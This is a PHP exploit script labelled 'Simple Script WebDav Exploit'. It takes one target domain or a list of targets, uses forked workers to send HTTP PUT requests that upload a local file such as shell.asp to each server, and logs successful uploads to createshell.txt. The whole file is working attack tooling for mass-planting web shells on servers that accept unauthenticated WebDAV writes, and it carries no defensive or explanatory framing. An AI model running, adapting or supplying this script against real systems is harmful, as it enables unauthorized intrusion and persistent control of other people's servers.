<?php
/* 
Author: @AdeRoot
Simple Script WebDav Exploit
Greetz: TheShow, Mathew, leaf
Since: 2015
OS Linux
*/
           
echo "Author: @AdeRoot\n\n";
echo " // WebDav Exploit\n\n";
if($argc == 1) {
	echo "Help parameter: | -h--help\n";
	exit(1);
}

function help() {
   echo "Options[+]:\n\n";
   echo "Dominio:   | -d--dominio\n";
   echo "Lista:     | -l--lista\n";
   echo "Thread:    | -t--thread\n";
   echo "File:      | -f--file\n";
   echo "Create:    | -c--create\n\n";
   echo "Single:\n\n";
   echo "Usage: php webdav.php -d xxx -f xxx -c xxx\n";
   echo "Example: php webdav.php -d www.example.com -f /path/shell.asp -c shell.asp\n\n";
   echo "Lista:\n\n";
   echo "Usage: php webdav.php -l xxx -t xxx -f xxx -c xxx\n";
   echo "Example: php webdav.php -l lista.txt -t 10 -f /path/shell.asp -c shell.asp\n\n";
}

error_reporting(0);
set_time_limit(0);

$opts = getopt("hd:f:l:t:c:");
foreach(array_keys($opts) as $opt) switch($opt) {
	case "h":
	help();
	break;

	case "d":
        $site = $opts["d"];
        $file = $opts["f"];
        $create = $opts["c"];
        post($site);
        break;

        case "l":
        $site = array_filter(explode("\n",file_get_contents($opts["l"])));
        $thread = $opts["t"];
        $file = $opts["f"];
        $create = $opts["c"];
        thread($site,$thread,$file,$create);
        break;
 }

function thread($site,$thread,$file,$create) {
    $out = 0;
    $thr = $thread;
    $ini = 0;
    $fin = $thr - 1;
    while(1){
    $childs = array();
    for ($count = $ini; $count <= $fin; $count++){
      if(empty($site[$count])){
     $out = 1;
        continue;
     }
      $pid = pcntl_fork();
     if ( $pid == -1 ) {
       echo "Fork error\n";
     exit(1);
    } else if ($pid) {
     array_push($childs, $pid);
    } else { 
      post($site[$count]);
     exit(0);
      }
    }
    foreach($childs as $key => $pid){
       pcntl_waitpid($pid, $status);
    }
    if($out == 1){
     exit(0);
  }
    $ini = $fin + 1;
    $fin = $fin + $thr;
    }
}    

function post($site) {
global $file, $create;
$filesize = filesize($file);
$fp = fopen($file, "r");
if(preg_match("@http://@", $site)) {
    $site = $site;
} else {
   $site = "http://".$site;
}
$site = $site."/".$create;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
curl_setopt($ch, CURLOPT_PUT, true);
curl_setopt($ch, CURLOPT_INFILE, $fp);
curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
$exec = curl_exec($ch);
echo $site."=>";
$result = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
fclose($fp);
if($result == 200 || $result == 201) {
    echo "Create Sucessful\n\n";
   file_put_contents("createshell.txt", $site."\n", FILE_APPEND);
} else {
  echo "Failed\n\n";
  }
}
if(isset($opts["f"]) and ($opts["c"])) {
   echo "End!\n\n";
} else if (!isset($opts["h"])){
  echo "option invalid or missing set more options\n\n";
}
?>
